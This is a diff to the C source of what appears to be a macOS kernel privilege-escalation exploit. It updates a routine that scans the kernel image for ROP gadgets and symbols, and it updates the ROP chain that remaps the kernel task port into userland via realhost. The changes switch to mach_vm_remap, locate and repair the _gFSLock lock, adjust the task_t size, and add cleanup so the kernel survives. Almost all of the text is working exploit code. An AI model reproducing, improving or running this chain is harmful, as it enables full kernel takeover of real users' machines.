@@ -54,7 +54,7 @@ do \
 } while(0)
 
 #define LE32(ptr) (((ptr)[0] | ((ptr)[1] << 8) | ((ptr)[2] << 16) | ((ptr)[3] << 24)))
-#define CALL_OFF(ptr) ((((int64_t)((ptr)[2] | ((ptr)[3] << 8) | ((ptr)[4] << 16)) << 40) >> 32) + 0x100)
+#define CALL_OFF(ptr) (int64_t)(int32_t)(LE32(ptr + 1) + 5)
 
 //uint8_t gad__add__rdi__ecx[]                    = { 0x01, 0x0f, 0x97, 0xc3 };       // add [rdi], ecx; xchg eax, edi; ret; XXX
 //uint8_t gad__mov_rdi__rax_8__call__rax_[]       = { 0x48, 0x8b, 0x78, 0x08, 0xff, 0x10 }; // mov rdi, [rax + 8]; call [rax];
@@ -100,7 +100,7 @@ int rop_gadgets(rop_t *rop, void *k)
                 SYM(bzero);
                 SYM(memcpy);
                 SYM(PE_current_console);
-                SYM(vm_map_remap);
+                SYM(mach_vm_remap);
                 SYM(ipc_port_alloc_special);
                 SYM(ipc_port_make_send);
                 SYM(ipc_kobject_set);
@@ -110,6 +110,9 @@ int rop_gadgets(rop_t *rop, void *k)
                 SYM(zone_map);
                 SYM(realhost);
                 SYM(mac_policy_list);
+                SYM(IOLockAlloc);
+                SYM(lck_mtx_lock);
+                SYM(IOHibernateIOKitSleep);
                 SYM(hibernate_machine_init);
 
                 // High Sierra renames mach_vm_wire to mach_vm_wire_external, so just
@@ -132,7 +135,7 @@ int rop_gadgets(rop_t *rop, void *k)
     ENSURE(bzero);
     ENSURE(memcpy);
     ENSURE(PE_current_console);
-    ENSURE(vm_map_remap);
+    ENSURE(mach_vm_remap);
     ENSURE(mach_vm_wire);
     ENSURE(ipc_port_alloc_special);
     ENSURE(ipc_port_make_send);
@@ -143,6 +146,9 @@ int rop_gadgets(rop_t *rop, void *k)
     ENSURE(zone_map);
     ENSURE(realhost);
     ENSURE(mac_policy_list);
+    ENSURE(IOLockAlloc);
+    ENSURE(lck_mtx_lock);
+    ENSURE(IOHibernateIOKitSleep);
     ENSURE(hibernate_machine_init);
 
     FOREACH_CMD(kernel, cmd)
@@ -193,6 +199,28 @@ int rop_gadgets(rop_t *rop, void *k)
                 }
             }
 
+            // _gFSLock
+            if(rop->_gFSLock == 0)
+            {
+                uint64_t addr = rop->IOHibernateIOKitSleep;
+                if(addr >= seg->vmaddr && addr < seg->vmaddr + seg->vmsize)
+                {
+                    void *func = kernel + (addr + seg->fileoff - seg->vmaddr);
+                    uint8_t *load = memmem(func, 0x40, (uint8_t[]){ 0x48, 0x8b, 0x3d }, 3); // mov rdi, [...]
+                    if
+                    (
+                        load &&
+                        load[7] == 0xe8 &&  // call ...
+                        ((char*)&load[7] - kernel - seg->fileoff + seg->vmaddr) + CALL_OFF(&load[7]) == rop->lck_mtx_lock
+                    )
+                    {
+                        rop->_gFSLock = ((char*)load - kernel - seg->fileoff + seg->vmaddr) + 7 +   // rip
+                                        LE32(&load[3]);                                             // offset
+                        LOG("%-30s: 0x%016llx", "_gFSLock", rop->_gFSLock);
+                    }
+                }
+            }
+
             // taggedRelease vtab offset
             if(rop->taggedRelease_vtab_offset == 0)
             {
@@ -231,6 +259,7 @@ int rop_gadgets(rop_t *rop, void *k)
     }
 
     ENSURE(_hibernateStats);
+    ENSURE(_gFSLock);
     ENSURE(taggedRelease_vtab_offset); // even this can never be 0, since destructor is first in vtab
     ENSURE(OSArray_array_offset);
 
@@ -344,16 +373,17 @@ int rop_gadgets(rop_t *rop, void *k)
                     ret &&
                     ret[-1]  == 0x5d &&                     // pop rbp
                     ret[-2]  == 0xc0 && ret[-3] == 0x31 &&  // xor eax, eax
-                    ret[-7]  == 0xfb && ret[-8] == 0xe8 &&  // call ...
+                    ret[-8]  == 0xe8 &&  // call ...
                     ((char*)&ret[-8] - kernel - seg->fileoff + seg->vmaddr) + CALL_OFF(&ret[-8]) == rop->memcpy &&
                     ret[-13] == 0xba                        // mov edx, ...
                 )
                 {
-                    uint32_t imm = LE32(&ret[-12]);
-                    if(imm >= rop->OSArray_array_offset + 8 && imm <= 0x100) // acceptable ranges
+                    rop->memcpy_gadget_imm = LE32(&ret[-12]);
+                    if(rop->memcpy_gadget_imm >= rop->OSArray_array_offset + 8 && rop->memcpy_gadget_imm <= 0x100) // acceptable range
                     {
                         rop->memcpy_gadget = (char*)&ret[-13] - kernel - seg->fileoff + seg->vmaddr;
                         LOG("%-30s: 0x%016llx", "memcpy_gadget", rop->memcpy_gadget);
+                        LOG("%-30s: 0x%016llx", "memcpy_gadget_imm", rop->memcpy_gadget_imm);
                     }
                 }
             }
@@ -365,6 +395,7 @@ int rop_gadgets(rop_t *rop, void *k)
     ENSURE(mov_rsi_r15_call__vtab0_);
     ENSURE(stack_pivot);
     ENSURE(mov_r9__rbp_X__call_rax);
+    // Don't need to check memcpy_gadget_imm
 
     return 0;
 }
@@ -375,9 +406,13 @@ do \
     *buf = (val); \
     ++buf; \
     addr += s; \
+    if(addr >= end_addr) \
+    { \
+        return 1; \
+    } \
 } while(0)
 
-void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
+int rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
 {
     LOG("Building ROP chain...");
     const size_t s = sizeof(*buf);
@@ -461,7 +496,7 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(rop->bzero);
 
     // bring the kernel task port to userland:
-    // vm_map_remap(
+    // mach_vm_remap(
     //     kernel_map,
     //     &remap_addr,
     //     sizeof(task_t),
@@ -478,7 +513,7 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     // realhost.special[4] = ipc_port_make_send(ipc_port_alloc_special(ipc_space_kernel));
     // ipc_kobject_set(realhost.special[4], remap_addr, IKOT_TASK);
 
-    // vm_map_remap(...)
+    // mach_vm_remap(...)
     PUSH(rop->pop_rdi);                                 // get kernel_task
     PUSH(rop->kernel_task);
     PUSH(rop->mov_rax__rdi__pop_rbp);                   // dereference to rax
@@ -498,7 +533,7 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(0xffffff80dead100b);                           // dummy rbp
     PUSH(remap_addr);                                   // rsi
     PUSH(rop->pop_rdx);
-    PUSH(1360);                                         // rdx = sizeof(task_t)
+    PUSH(1400);                                         // rdx = sizeof(task_t)
     PUSH(rop->pop_rcx);
     PUSH(0);                                            // rcx = mask
     PUSH(rop->pop_r8_pop_rbp);
@@ -509,8 +544,8 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     //PUSH(rop->mov_r9__rbp_0x38__call_rax); XXX
     PUSH(rop->mov_r9__rbp_X__call_rax);
     // Finally, the call:
-    PUSH(rop->vm_map_remap);
-    PUSH(rop->add_rsp_0x20_pop_rbp);                            // return address for vm_map_remap
+    PUSH(rop->mach_vm_remap);
+    PUSH(rop->add_rsp_0x20_pop_rbp);                    // return address for mach_vm_remap
     // Arguments on the stack:
     PUSH(0xffffff80000faded);                           // dummy, kernel_task gets written here
     PUSH(0);                                            // false
@@ -523,6 +558,7 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(remap_addr);
     PUSH(rop->mov_rax__rdi__pop_rbp);                   // dereference
     PUSH(0xffffff80dead100d);                           // dummy rbp
+    //PUSH(0xffffffffdddddddd); // XXX YYY
     PUSH(rop->pop_rcx);
     PUSH(rop->pop_rdi);                                 // load kernel_map later
     PUSH(rop->mov_rdx_rax_pop_rbp_jmp_rcx);             // this gets us remap_addr to rdx
@@ -534,9 +570,9 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(rop->pop_rdi);                                 // load realhost later
     PUSH(rop->mov_rsi_rax_pop_rbp_jmp_rcx);             // this gets us kernel_map to rsi
     PUSH(0xffffff80dead1011);                           // dummy rbp
-    PUSH(rop->realhost);                                // rdi = readhost
+    PUSH(rop->realhost);                                // rdi = realhost
     PUSH(rop->pop_rcx);
-    PUSH(1360);                                         // rcx = sizeof(task_t)
+    PUSH(1400);                                         // rcx = sizeof(task_t)
     PUSH(rop->pop_r8_pop_rbp);
     PUSH(0x3);                                          // r8 = VM_PROT_READ | VM_PROT_WRITE
     PUSH(0xffffff80dead1012);                           // dummy rbp
@@ -594,6 +630,25 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(rop->mov__rdi__rax_pop_rbp);                   // store kOSBooleanTrue to beginning of buffer
     PUSH(0xffffff80dead1022);                           // dummy rbp
 
+    // bzero the memory our exploit has memcpy'ed to
+    hibernate_statistics_t hib_dummy;
+    uint64_t hib_memcpy_base = rop->_hibernateStats + (uint64_t)&hib_dummy.graphicsReadyTime - (uint64_t)&hib_dummy;
+    PUSH(rop->pop_rdi);
+    PUSH(hib_memcpy_base);
+    PUSH(rop->pop_rsi);
+    PUSH(rop->memcpy_gadget_imm);
+    PUSH(rop->bzero);
+
+    // If we've broken gFSLock, repair that too
+    if(rop->_gFSLock >= hib_memcpy_base && rop->_gFSLock < hib_memcpy_base + rop->memcpy_gadget_imm)
+    {
+        PUSH(rop->IOLockAlloc);                         // Just allocate a new lock
+        PUSH(rop->pop_rdi);
+        PUSH(rop->_gFSLock);
+        PUSH(rop->mov__rdi__rax_pop_rbp);               // Store pointer in gFSLock
+        PUSH(0xffffff80dead10cc);                       // dummy rbp
+    }
+
     // Return to original stack
     PUSH(rop->pop_rdi);                                 // load address where rbp was saved
     PUSH(old_rbp_addr);                                 // old rbp address
@@ -616,4 +671,6 @@ void rop_chain(rop_t *rop, uint64_t *buf, uint64_t addr)
     PUSH(0xffffff80deadbeef);
     PUSH(0xffffff80deadf00d);
     PUSH(0xffffff80deadc0de);
+
+    return 0;
 }
